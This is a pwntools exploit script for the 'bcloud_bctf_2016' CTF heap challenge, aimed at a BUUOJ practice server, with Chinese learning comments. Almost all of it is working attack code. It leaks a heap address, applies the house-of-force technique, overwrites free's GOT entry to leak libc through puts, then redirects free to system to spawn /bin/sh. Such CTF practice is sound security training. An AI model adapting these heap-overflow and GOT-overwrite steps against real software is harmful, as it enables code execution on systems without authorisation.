from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './bcloud_bctf_2016'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',25267) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu18_64/libc-2.27.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(len,content=b'a'):
    sla(b'--->>',b'1')
    sla(b':',int2bytes(len))
    sla(b':',content)

def syn():
    sla(b'--->>',b'5')


def edit(index,content):
    sla(b'--->>',b'3')
    sla(b':',int2bytes(index))
    sla(b':',content)

def delete(index):
    sla(b'--->>',b'4')
    sla(b':',int2bytes(index))

ptr = 0x0804B120
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
free_got = elf.got['free']

#house of force
sa(b'name:',b'a'*0x40)
ru(b'a'*0x40)
heap_addr = uu32(r(4))
top_chunk_addr = heap_addr + 0xd0
log.success('heap_addr '+hex(heap_addr))
#这里输入org一开始我写的时sla然后无法溢出top chunk size
#后来发现应该是Host读入了换行符，所以一定要注意加不加换行符
sa(b'Org:',b'a'*0x40)
sla(b'Host:',p32(0xffffffff))

#
offset = ptr - top_chunk_addr - 0x10
add(offset)#0
#注意这里的跳过了第一个chunk的位置从第二个开始赋值free_got及其他，我自己一开始不理解，就删掉了p32(0)选择用chunk0进行覆写，后失败
#经仔细看代码发现本题中的size一直是有符号int而非无符号数，故chunk0的size_ptr中记录的是负数，无法正常读入数据，应从chunk1开始覆写
#另外还有一点值得注意，就是写入binsh后给地址，学习了，我自己可能只能想到one_gadget
payload = p32(0) + p32(free_got) + p32(puts_got) + p32(0x0804B130) + b'/bin/sh\x00'
add(0x18,payload)#1

#修改free的got表为puts的plt表
edit(1,p32(puts_plt))
# dbg()
#泄露puts的地址
delete(2)
puts_addr = uu32(ru(b'\xf7',drop=False)[-4:])
log.success('system_addr ' + hex(puts_addr))
system_addr,bin_sh_addr = ret2libc(puts_addr,'puts')
log.success('system_addr ' + hex(system_addr))

#修改free的got表为system地址
edit(1,p32(system_addr))

#getshell
delete(3)
# end

itr()